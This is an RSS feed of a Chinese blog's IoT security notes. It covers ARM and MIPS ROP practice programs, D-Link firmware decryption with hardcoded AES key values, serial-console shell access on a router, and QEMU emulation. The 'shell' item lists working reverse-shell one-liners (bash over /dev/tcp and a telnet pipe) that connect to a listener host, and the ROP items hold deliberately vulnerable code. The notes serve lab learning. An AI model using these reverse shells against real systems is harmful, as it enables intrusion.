<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>note on CAI dog</title>
    <link>https://jellyfish-pro.github.io/note/</link>
    <description>Recent content in note on CAI dog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language><atom:link href="https://jellyfish-pro.github.io/note/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>[置顶] 注意事项</title>
      <link>https://jellyfish-pro.github.io/note/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</guid>
      <description>这里总结了一些可以快速使用的命令，并不会涉及原理，如果您使用这些命令后报错或者是没有达到效果，请不要在此过多的纠结 </description>
    </item>
    
    <item>
      <title>arm下的rop</title>
      <link>https://jellyfish-pro.github.io/note/arm%E4%B8%8B%E7%9A%84rop%E5%AD%A6%E4%B9%A0/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/arm%E4%B8%8B%E7%9A%84rop%E5%AD%A6%E4%B9%A0/</guid>
      <description>arm下的rop 这次我们采用了如下的练习代码
#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;char str1[] = &amp;#34;uname -a&amp;#34;;char str2[] = &amp;#34;touch pwned.txt&amp;#34;;char str3[] = &amp;#34;ls -sail&amp;#34;;char str4[] = &amp;#34;/bin/sh&amp;#34;;void winner(){printf(&amp;#34;Nothing interesting here...n&amp;#34;);system(&amp;#34;# this does nothing...&amp;#34;);exit(0);}void gadget(){__asm__(&amp;#34;pop {r0,pc}&amp;#34;);}int main(){char buff[16];printf(&amp;#34;Welcome to ROPLevel2 created by Billy Ellis (@bellis1000)n&amp;#34;);printf(&amp;#34;The objective of this level is to execute a shell command of your choice by using a ROP gadget followed by jumping to system()n&amp;#34;);printf(&amp;#34;Good luck: &amp;#34;);scanf(&amp;#34;%s&amp;#34;,buff);printf(&amp;#34;Nice try ;)n&amp;#34;);return 0;} arm-linux-gnueabi-gcc -fno-stack-protector arm-rop.</description>
    </item>
    
    <item>
      <title>arm交叉编译</title>
      <link>https://jellyfish-pro.github.io/note/arm%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/arm%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/</guid>
      <description>arm交叉编译 环境搭建 //arm交叉编译链接工具：sudo apt-get install gcc-arm-linux-gnueabi g++-arm-linux-gnueabi//arm浮点型交叉编译链接工具：sudo apt-get install gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf 编译 //arm_test.cinclude &amp;lt;stdio.h&amp;gt;int main(void){printf(&amp;#34;hello world\n&amp;#34;);return 0;} 同样，如果直接编译的话，是动态编译：
arm-linux-gnueabi-gcc arm_test.c -o test 需要使用qemu的-L参数指定动态链接库：
qemu-arm-static -L /usr/arm-linux-gnueabi test 也可以使用使用静态链接：
arm-linux-gnueabi-gcc arm_test.c -static -o test </description>
    </item>
    
    <item>
      <title>dlink dir-878通过串口获取shell</title>
      <link>https://jellyfish-pro.github.io/note/dlink-dir-878%E9%80%9A%E8%BF%87%E4%B8%B2%E5%8F%A3%E8%8E%B7%E5%8F%96shell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/dlink-dir-878%E9%80%9A%E8%BF%87%E4%B8%B2%E5%8F%A3%E8%8E%B7%E5%8F%96shell/</guid>
      <description>dlink dir-878通过串口获取shell 写在前面 焊针脚真的是一个体力活，不难，但是没有好的工具，实施起来就太麻烦了。
文章只会介绍怎么找到GND和TX,然后通过排除法找到RX，而对于焊针脚不会详细描写。
焊了针脚后其实也不能直接获得shell，还需要一些操作，这一部分会详细写。
判断针脚 我的万用表的配置是这样的，因为我接触到iot设备的电流基本是3V，所以选择的是V而不是mV。
然后黑线抵住wiki的卡扣，红线抵住针脚：
通电后，挨个测试针脚，一般来说是0V的就是GND。
然后重启路由器，测试剩下的三个针脚，如果有一个针脚在3V和1点几V左右来回跳动，那么说明这大概率是一个TX。
那么剩下的VCC和RX，两个做排除法就好了。在实际dir-878中VCC是3V而RX是0.2V。
获取shell 焊上针脚，找到GND和TX后我们就可以尝试连接串口了，dir-878的波特率为56000。
进入串口，并且等待启动信息输出完毕，我们可以看到一个有着cmd&amp;gt;输入终端，这个终端可以输入任何字符，但是不会有回显：
这里我们去搜索一下这个字符串：
可以看到在如下的文件中出现可这个字符串，其实我们可以直接确定就在rc这个二进制文件中，因为这四个文件，只有rc和启动相关。
通过cmd&amp;gt;我们可以直接找到交叉引用。通过这一段的逻辑，我们可以知道这里是在比较密码，而密码来自于console_pwd这个nvram环境变量。
那我们直接搜索这个console_pwd这个字符串：
这里找到一个类似的东西，我们可以去试一试这个dlink
发现密码确实是这个东西</description>
    </item>
    
    <item>
      <title>dlink固件解密分析</title>
      <link>https://jellyfish-pro.github.io/note/dlink%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/dlink%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/</guid>
      <description>dlink固件解密分析 写在前面 之前解压固件基本都是用的工具，碰到加密的就只能上设备去提取。
这次正好有机会碰到需要模拟dlink867，需要解压固件，正好也有资料。
就用这次机会当敲门石，从dlink推广到更多的设备固件解密
寻找基本信息 一般来说，当我们要更新固件，会先通过网页上传固件。所以我们可以通过上传固件所访问的文件、数据去寻找解密的二进制文件。
不过这里因为我手上没有dlink867设备，所以就直接使用了资料中说的二进制文件。/bin/imgdecrypt
我们可以file看一下：
可以看到这是一个mips的二进制文件，那么放入ida中查看一下：
可以看到这个二进制文件的main函数十分的清楚，就是分为加密和解密
当然我们关注的是解密函数，那么我们进入解密函数查看一下，同时我们也要注意传入解密函数的参数：
这里可以看到这个函数的大致流程，同时这里我们可以看到程序会判断运行时传入的参数个数。
我已经将命令注释在了上面。/bin/imgdecrypt /tmp/firmware.img
至于怎么寻找这个命令怎么找到的，我们可以使用以下的命令：
grep -lire imgdecrypt 在这个prog-cgi中就可以找到启动命令。
解密逻辑 上面我们了解到了一些基本的信息，现在我们来说dlink固件解密的流程：
通过这个程序的流程，我们可以看到，这里处理了两个东西：
key firmware 对key的处理 我们先说说对key的处理，我们进入这个init_key的函数：
这里有四个参数，他们的作用如下：
这里我们需要注意的是第一个、第三个、第四个参数。
第一个参数是密钥的密文，32个字节 第三个参数是密钥的密钥，16个字节 第四个参数是AES的ivec向量，16个字节 同时我们可以看到这三个参数全来自一个地方。off_4130A0
ciphertext = &amp;#39;C8D32F409CACB347C8D26FDCB9090B3C&amp;#39;key = &amp;#39;358790034519F8C8235DB6492839A73F&amp;#39;ivec = &amp;#39;98C9D8F0133D0695E2A709C8B69682D4&amp;#39; 这样我们就可以将固件的密钥给解密出来。
对固件的处理 这里我们进入了do_dec函数，这个函数中的逻辑比较简单，简单来说，程序会分别计算固件解密前的hash和解密后的hash，然后再计算解密后的固件+长度+密钥的hash。
其实，如果我们只要求解密固件的话，我们只需要关注dec函数即可。
但是在看dec函数之前我们需要先了解一下dlink固件的结构：
可以看到，被加密的固件前0xDC个字节存放着magic字段、加密固件的长度、解密后固件的长度、ivec向量和hash值。
了解了这个结构后，我们就可以看看二进制文件究竟干了什么：
首先，要检查加密固件的magic字段。
随后将密文部分+dec_img_len一起计算固件hash，并且和解密后固件的hash比较
然后将密文+dec_img_len+密钥+ivec向量，进行解密固件
随后再将解密后的固件+enc_img_len一起计算固件hash，并且和加密固件的hash进行比较
最后再将解密后的固件+enc_img_len+密钥一起计算hash，并且和解密+长度+密钥的hash进行比较
解密脚本 现在我们知道解密需要哪些参数，并且参数是从哪里来的，那么我们直接解密就可以了：
#!/usr/bin/python3import pathlibimport sysfrom Crypto.Cipher import AESclass Dlink_dec:def __init__(self, inf, outf):self.</description>
    </item>
    
    <item>
      <title>firmware-analysis-toolkit安装记录</title>
      <link>https://jellyfish-pro.github.io/note/firmware-analysis-toolkit%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/firmware-analysis-toolkit%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</guid>
      <description>firmware-analysis-toolkit安装记录 firmware-analysis-toolkit是一个集成了binwalk、firmadyne、qemu为一体的工具，也就是这个工具包含了固件解压、固件模拟一系列的操作。
但需要注意的是，近几年随着固件加密和iot设备复杂性的提升，所以对固件的解压和模拟并不能通过一个工具来自动化实现，其中需要我们来手动进行一些操作。
安装前准备 安装过binwalk工具的朋友都知道，在ubuntu20或ubuntu22上，binwalk的一些插件是无法正常安装的。故这里我们选择的是在ubuntu18安装这个工具。
并且提前给git设置了全局代理：
git config --global https.proxy http://192.168.113.1:7890git config --global https.proxy https://192.168.113.1:7890 还有pip全局换源：
echo &amp;#34;[global]&amp;#34; &amp;gt; ~/.pip/pip.confecho &amp;#34;index-url = https://mirrors.ustc.edu.cn/pypi/web/simple&amp;#34; &amp;gt;&amp;gt; ~/.pip/pip.conf 随后将firmware-analysis-toolkit 克隆到本地：
git clone https://github.com/attify/firmware-analysis-toolkit.git 克隆完成后直接执行./setup.sh，就可以安装
安装binwalk 虽然有脚本可以直接安装，但是会有各种各样的问题。
前置依赖问题 在安装binwalk时我就遇到了一个问题
我们直接搜索 Can&#39;t rollback pillow, nothing uninstalled.就可以看到需要安装前置依赖：
sudo apt-get install python-dev python3-dev libxml2-dev libxslt1-dev zlib1g-dev libsasl2-dev libldap2-dev build-essential libssl-dev libffi-dev libmysqlclient-dev libjpeg-dev libpq-dev libjpeg8-dev liblcms2-dev libblas-dev libatlas-base-dev git clone 失败 在安装binwalk时，会安装很多插件，这些插件可能需要去github进行克隆，但执行脚本时，特别容易克隆失败（但如果将克隆命令单独拿出来执行，则不会失败，不是很能理解为什么会出现这种情况）
这时候我们就需要观察binwalk的安装脚本，以sasquatch为例，这里是先克隆，再执行命令，再删除。
所以这里我先把sasquatch手动克隆到/tmp下，然后再把克隆和删除命令给注释掉。
安装ubi_reader binwalk会有一个名叫ubi_reader的插件，这个插件如果安装binwalk安装脚本来执行的话，是无法安装成功的。可能是因为两边版本没有同步，在ubi_reader的仓库中已经没有setuo.</description>
    </item>
    
    <item>
      <title>fuzz工具SaTC安装使用记录</title>
      <link>https://jellyfish-pro.github.io/note/fuzz%E5%B7%A5%E5%85%B7satc%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/fuzz%E5%B7%A5%E5%85%B7satc%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</guid>
      <description>fuzz工具SaTC安装使用记录 写在前面 最近在研究一些fuzz工具的使用，看能不能找一些0day出来。幻想着靠fuzz工具走上人生巅峰（雾）
了解了两款fuzz工具，一款boofuzz，不过在安装的时候出了一些问题，在通过小道消息询问解决方案的时候，了解到了SaTC这个工具，发现两个工具是互补的，所以就先试了试SaTC。
又因为SaTC使用的是docker，而我挺久没用docker了，所以来做点记录
title: SaTC安装记录 toc: true authors: [] tags: [] categories: [] series: [] SaTC安装记录 SaTC这个很方便的一点是有中文README。
在README中提到了两个安装方法：
建议通过使用Dockerfile来构建系统环境:
# 进入SaTC代码目录cd SaTC # 构建Docker镜像docker build . -t satc# 进入Dokcer环境, 自行添加目录映射docker run -it satc 如果因为网络等原因无法构建，可使用我们提供等docker image
# 从docker hun拉去imagedocker pull smile0304/satc:V1.0# 进入Dokcer环境, 自行添加目录映射docker run -it smile0304/satc:V1.0 第一个使用Dockerfile的方式，在我的环境上安装失败，但并没有提示具体是什么错误。
第二个方式就会方便许多，直接执行docker拉取命令就可以下载到本地。
不过在启动Docker时，需要自己指定目录映射（或者通过docker命令将固件中的文件系统放进去）
docker run --name satc-netgear -v /home/shangdi4sb/device/netgear:/home/satc/netgear -it smile0304/satc:V1.0 &amp;ndash;name ：是我给这个容器取的名字，因为这次尝试挖掘网件，就取名netgear -v ：指定的映射目录，冒号前面是本地目录，后门是docker里的目录 进入docker后，就可以看到共享的文件夹和Satc的文件夹</description>
    </item>
    
    <item>
      <title>git连接远程仓库并添加密钥</title>
      <link>https://jellyfish-pro.github.io/note/git%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E5%B9%B6%E6%B7%BB%E5%8A%A0%E5%AF%86%E9%92%A5/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/git%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E5%B9%B6%E6%B7%BB%E5%8A%A0%E5%AF%86%E9%92%A5/</guid>
      <description>git连接远程仓库并添加密钥 首先先初始化本地仓库
git init 然后设置用户名和邮箱：
git config --global user.name &amp;#39;user_name&amp;#39;git config --global user.email &amp;#39;xxx@qq.com&amp;#39; 这时再生成密钥：
ssh-keygen -t rsa -C &amp;#39;xxx@qq.com&amp;#39; 将id_rsa.pub放到github
然后连接远程仓库
git remote add origin https://github.com/xxxxx.git git设置代理
git config --global https.proxy http://127.0.0.1:1080git config --global https.proxy https://127.0.0.1:1080git config --global --unset http.proxygit config --global --unset https.proxy </description>
    </item>
    
    <item>
      <title>ida未正确识别数据类型</title>
      <link>https://jellyfish-pro.github.io/note/ida%E6%9C%AA%E6%AD%A3%E7%A1%AE%E8%AF%86%E5%88%AB%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/ida%E6%9C%AA%E6%AD%A3%E7%A1%AE%E8%AF%86%E5%88%AB%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</guid>
      <description>在ida中有事会出现如下情况：
可以看到这里正确的数据类型应该为word，但是ida并没有正确识别，而是将word识别为byte。
这时需要我们手动该更数据类型，快捷键按D。
更改后为：</description>
    </item>
    
    <item>
      <title>ida未识别到函数</title>
      <link>https://jellyfish-pro.github.io/note/ida%E6%9C%AA%E8%AF%86%E5%88%AB%E5%88%B0%E5%87%BD%E6%95%B0/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/ida%E6%9C%AA%E8%AF%86%E5%88%AB%E5%88%B0%E5%87%BD%E6%95%B0/</guid>
      <description>ida在识别mips和arm时，容易遇到未识别到函数的问题
看上去就是ida汇编显示红色：
这种情况就是ida没有自动识别到函数的边界，这时候就需要我们来指定。
首先选中边界点：
然后按如下顺序点击按钮
Edit -&amp;gt; Functions -&amp;gt; Create function 或者按快捷键p
随后ida就可以自动识别了</description>
    </item>
    
    <item>
      <title>mips下的rop</title>
      <link>https://jellyfish-pro.github.io/note/mips%E4%B8%8B%E7%9A%84rop%E5%AD%A6%E4%B9%A0/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/mips%E4%B8%8B%E7%9A%84rop%E5%AD%A6%E4%B9%A0/</guid>
      <description>关于mips下的rop学习 关于mips中rop链的查找 与x86下寻找rop不同，ROPgadget对于寻找mips的rop不太方便，所以这里我们就需要安装ida下的mipsfinder插件，具体的方法。
这里我们需要说明一些需要注意的地方：
我们不仅需要点击MIPS ROP Finder
还需要点击mips rop gadgets
不然会报错，找不到stackfinder()函数
计算偏移 //rop-test.c#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;sys/stat.h&amp;gt;#include &amp;lt;string.h&amp;gt;void do_system(int code,char *cmd){char buf[255];//sleep(1);system(cmd);}int main(){char buf[256]={0};char ch;int count = 0;unsigned int fileLen = 0;struct stat fileData;FILE *fp;if(0 == stat(&amp;#34;passwd&amp;#34;,&amp;amp;fileData))fileLen = fileData.st_size;elsereturn 1;if((fp = fopen(&amp;#34;passwd&amp;#34;,&amp;#34;rb&amp;#34;)) == NULL){printf(&amp;#34;Cannot open file passwd!</description>
    </item>
    
    <item>
      <title>mips交叉编译</title>
      <link>https://jellyfish-pro.github.io/note/mips%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/mips%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/</guid>
      <description>mips中需要重点关注的几个寄存器 $a0-$a3进行传参 $sp为栈顶寄存器，$fp为栈底寄存器 $ra则存放返回地址 安装交叉连接工具 大段：
sudo apt-get install linux-libc-dev-mips-crosssudo apt-get install libc6-mips-cross libc6-dev-mips-crosssudo apt-get install binutils-mips-linux-gnu gcc-mips-linux-gnusudo apt-get install g++-mips-linux-gnu 小段：
sudo apt-get install linux-libc-dev-mipsel-crosssudo apt-get install libc6-mipsel-cross libc6-dev-mipsel-crosssudo apt-get install binutils-mipsel-linux-gnu gcc-mipsel-linux-gnusudo apt-get install g++-mipsel-linux-gnu 交叉编译 //mips_test.c#include &amp;lt;stdio.h&amp;gt;int main(void){print(&amp;#34;hello world&amp;#34;);return 0;} 接下来使用交叉编译工具编译
mips-linux-gnu-gcc mips_test.c -o test 需要注意的是，这样直接编译出来的结果是动态链接，所以直接使用qemu用户模式，会报错。
解决方法为使用qemu用户模式的-L参数，临时更换根目录：
qemu-mips-static -L /usr/mips-linux-gnu/ test 或者是使用静态编译：
mips-linux-gnu-gcc mips_test.c -static -o test </description>
    </item>
    
    <item>
      <title>nfs共享文件夹命令</title>
      <link>https://jellyfish-pro.github.io/note/nfs%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/nfs%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9%E5%91%BD%E4%BB%A4/</guid>
      <description>在一些设备上，比如海康威视，使用的是阉割的busybox，没有wget、curl，甚至没有nc
这时候可以选择使用nfs共享文件夹命令
使用之前需要进行安装：
sudo apt-get install nfs-kernel-server # 安装 NFS服务器端sudo apt-get install nfs-common # 安装 NFS客户端 随后打开服务：
sudo /etc/init.d/nfs-kernel-server start 或者 sudo /etc/init.d/nfs-kernel-server restart 使用如下命令可以查看nfs服务状态：
service nfs-server status 随后我们写配置文件：
sudo vim /etc/exports 将下面内容复制到配置文件中
/home/shangdi4sb/nfs *(rw,sync,no_root_squash,no_subtree_check) *代表了所有的网段都可以访问。
rw代表了可读可写。
这个我只使用nfs传递文件，故不对其他的几个参数做过多的解释。
sudo mount -t nfs 192.168.113.128:/home/shangdi4sb/nfs ./nfs 可以看到这个结构很简单，就不多解释了
如果显示挂载失败可以尝试*-o*参数
sudo mount -t nfs 192.168.113.128:/home/shangdi4sb/nfs ./nfs -o nolcok </description>
    </item>
    
    <item>
      <title>python3中的数据类型转换</title>
      <link>https://jellyfish-pro.github.io/note/python3%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/python3%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</guid>
      <description>python3中的数据类型转换 写在前面
之前在做ctf就涉及到泄露地址的情况，因为收到的一般是byte类型，但是如果要计算基地址的话就需要将byte转化为int类型。
当时做转化就觉得很烦，随着后面接触的ctf的减少，就渐渐忘记了这件事。
这次又遇到ctf，又在这个地方纠结了半天，所以这次做一个系统的总结。
bytes转int 其实int主要分为两部分，一个是十进制，一个是十六进制。
这里创建了一个6字节的bytes，来模拟接收到一个6字节的地址：
byte = b&amp;#39;0x7f77bc08aef3&amp;#39; 接下来我们要对这个byte进行如下操作：
将8个字节转为int类型，方便计算基地址 将int类型使用十六进制输出，来检查地址是否正确 最后使用p64()函数，进行包装，模拟发送回ctf 第一步 我们使用int()函数，但是需要注意该函数有两个参数，我们需要将base参数设置为16进制：
addr = int(byte, base = 16)print(&amp;#34;byte_addr to int : %d&amp;#34;%addr) 第二步 因为addr已经变为int类型了，所以这里直接使用hex()就可以：
hex_addr = hex(addr)print(&amp;#34;int_addr to hex : %s&amp;#34;%hex_addr) 第三步 这一步要使用p64()，但是我们要传入int类型。需要注意的是传入的是10进制，而不是16进制。
p64_addr = p64(addr)print(b&amp;#34;p64() : &amp;#34; + p64_addr) 最后 看看效果：
#!/usr/bin/python3from pwn import *byte = b&amp;#39;0x7f77bc08aef3&amp;#39;addr = int(byte, base = 16)print(&amp;#34;byte_addr to int : %d&amp;#34;%addr)hex_addr = hex(addr)print(&amp;#34;int_addr to hex : %s&amp;#34;%hex_addr)p64_addr = p64(addr)print(b&amp;#34;p64() : &amp;#34; + p64_addr) </description>
    </item>
    
    <item>
      <title>qemu-system桥接设置</title>
      <link>https://jellyfish-pro.github.io/note/qemu-system%E6%A1%A5%E6%8E%A5%E8%AE%BE%E7%BD%AE/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/qemu-system%E6%A1%A5%E6%8E%A5%E8%AE%BE%E7%BD%AE/</guid>
      <description>设置桥接的命令：
sudo ifconfig ens33 down # 先停用host的网卡sudo brctl addbr br0 # 添加名为br0的网桥sudo brctl addif br0 ens33 # 将host的网卡插到网桥br0上sudo brctl stp br0 off # 如果只有一个网桥，则关闭生成树协议sudo ifconfig br0 0.0.0.0 promisc up # 启用br0网桥，不分配ip，混杂模式sudo ifconfig ens33 0.0.0.0 promisc up # 启用host网卡，不分配ip，混杂模式sudo dhclient br0 # 让网桥从dhcp获取ipsudo tunctl -t tap0 # 创建一个tap网络设备，名字为tap0sudo brctl addif br0 tap0 # 将tap0插到网桥sudo ifconfig tap0 0.0.0.0 promisc up # 启用tap0，不分配ip，混杂模式 启动qemu-system的命令：</description>
    </item>
    
    <item>
      <title>qemu-system模拟dlink-dir867</title>
      <link>https://jellyfish-pro.github.io/note/qemu-system%E6%A8%A1%E6%8B%9Fdlink-dir867/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/qemu-system%E6%A8%A1%E6%8B%9Fdlink-dir867/</guid>
      <description>qemu-system模拟dlink-dir867 写在前面 之前也模拟过dlink的设备，不过当时更注重记录qemu的使用，而这次
记录更侧重对dlink的操作。
至于模拟成功没有，只能说成功了但是没有完全成功（如成
参考文章：
Debugging D-Link: Emulating firmware and hacking hardware (greynoise.io)
固件解密 这次我想要模拟的是DIR-867-US（美版），固件版本为： 如果直接binwalk解压，是解压不了的：
而在参考文章中有提到：
At the start of the file is a 4-byte sequence that maps to the ASCII characters “SHRS”.
A quick Google search for “SHRS firmware” turns up relevant results, indicating that we’re on the right track.
如何是“SHRS”打头的四个字节，就可以使用下面的工具进行解压：
0xricksanchez/dlink-decrypt: D-Link firmware decryption PoC (github.com)
python3 dlink-dec.py -i DIR-867_FW1.30B07.bin -o DIR-867_FW1.30B07.dec.bin 对解密脚本的分析，会晚一点进行~~（应该，大概，可能，八成，会写在最后）~~
文件系统分析 解压后可以得到一个名叫cpio-root的文件夹，首先我们还是去看看inittab：
随后我们查看这两个文件，发现makedevlinks.sh的主要作用是建立一些*/dev的管道，而init_system则是一个二进制文件，里面就包含lighttpd*的启动命令：</description>
    </item>
    
    <item>
      <title>qemu编译</title>
      <link>https://jellyfish-pro.github.io/note/qemu%E7%BC%96%E8%AF%91/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/qemu%E7%BC%96%E8%AF%91/</guid>
      <description>在ubuntu上直接使用 sudo apt install qemu安装qemu时，会遇到因为qemu版本过低导致模拟环境出现问题（例如：二进制文件是32位，但是在模拟出的环境中二进制文件的地址是8字节的情况）
为了避免这种情况，我们需要放弃apt安装，转而选择自行编译高版本的qemu。
我们可以在git的官网上下载最新版本的源码，或者在[仓库](Index of / (qemu.org))中寻找之前的版本，亦或者是在[官方的gitlab](QEMU / QEMU · GitLab)上寻找想要的版本
当我们拿到源码后，先安装依赖
sudo apt build-dep qemu 而后进入qemu源码文件夹进行配置：
./configure \--prefix= ~/qemu-user-static \ #这个选项是指定安装位置，我是直接安装到home目录下--static \ #指示静态链接--disable-system \ #不编译系统仿真程序--enable-linux-user #编译所有架构的用户态仿真程序 注意：
静态编译的时候需要指定&amp;ndash;disable-system选项，因为带softmmu 后缀的编译目标（即系统仿真程序）无论如何都会用到一些共享库，因此如果在指定了&amp;ndash;static选项但没有指定&amp;ndash;disable-system选项会导致后面的链接阶段报错。
编译，安装：
makemake install 最后给所有编译得到的目标重命名，为其添加一个&amp;quot;-static&amp;quot;后缀，这样qemu-debootstrap可以识别：
cd qemu-user-static/binfor i in *; do cp $i $i-static; done </description>
    </item>
    
    <item>
      <title>rinetd端口转发</title>
      <link>https://jellyfish-pro.github.io/note/rinetd%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/rinetd%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</guid>
      <description>rinetd是一个在linux上的端口转发工具。
安装方式 在github上搜索rinetd就可以找到官方仓库
安装命令在README里也有写：
./bootstrap./configure –prefix=/home/shangdi4sb/rinetd #home目录下makemake install 需要注意的是 configure时填写安装目录，我个人是习惯安装在home目录下
配置文件 配置文件的位置为：&amp;lt;安装目录&amp;gt;/etc/rinetd.conf
我们直接打开文件，按照如下格式写入内容就可以了，不需要理会配置文件原有的内容：
bindadress bindport connectaddress connectport监听的ip 监听ip的端口 转发的ip 转发ip的端口 例如我想把本地8080端口的数据转发到qemu(192.168.113.129)的80端口上
0.0.0.0 8080 192.168.113.129 80 启动rinetd rinetd的二进制文件存默认放在：&amp;lt;安装目录&amp;gt;/etc/rinetd.conf
使用如下命令：
./sbin/rinetd -f -c ./etc/rinetd.conf -f 不使用后台模式，一般使用这个参数是为了看报错
-c 指定配置文件</description>
    </item>
    
    <item>
      <title>shell</title>
      <link>https://jellyfish-pro.github.io/note/shell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/shell/</guid>
      <description>一般选择反弹shell 攻击机：
nc -lnvp 8080 目标机：
bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.113.128/8080 0&amp;gt;&amp;amp;1或bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.113.128/8080 0&amp;gt;&amp;amp;1&amp;#34; 或者
mknod /ram/f p; /bin/telnet 192.168.113.128 8080 &amp;lt; /ram/f | /bin/bash &amp;gt;/ram/f 2&amp;gt;&amp;amp;1 mknod：创建名为 /ram/f的管道
若在脚本中使用：
rm /tmp/f;mknod /tmp/f p;/bin/telnet 192.168.1.3 8080 &amp;lt; /tmp/f |/bin/bash &amp;gt;/tmp/f 2&amp;gt;/tmp/f </description>
    </item>
    
    <item>
      <title>tcpdump快速使用</title>
      <link>https://jellyfish-pro.github.io/note/tcpdump%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/tcpdump%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8/</guid>
      <description>在windows上可以使用burpsuite进行抓包。但burpsuite在linux上不便于安装。
在linux上我们可以使用tcpdump命令。
具体安装流程我们略过，如要安装可以直接百度。
通过host参数进行IP地址过滤：
tcpdump -n host 192.168.110.129 -n表示不把ip解析成域名
scr可以筛选来源地址：
tcpdump scr 192.168.110.129 dst可以筛选目的地址：
tcpdump dst 192.168.110.129 port指定端口
tcpdump port 8080 若要指定协议，则直接输入就好了：
tcpdump tcp或者tcpdump icmp </description>
    </item>
    
    <item>
      <title>ubuntu20 无setuptools下安装pip</title>
      <link>https://jellyfish-pro.github.io/note/ubuntu20-%E6%97%A0setuptools%E4%B8%8B%E5%AE%89%E8%A3%85pip/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/ubuntu20-%E6%97%A0setuptools%E4%B8%8B%E5%AE%89%E8%A3%85pip/</guid>
      <description>Ubuntu20及以上版本，虽会自带python2，但python2中不会自带pip和setuptools这两个模块。
同时使用Ubuntu20及以上版已经将python-pip移除apt库。
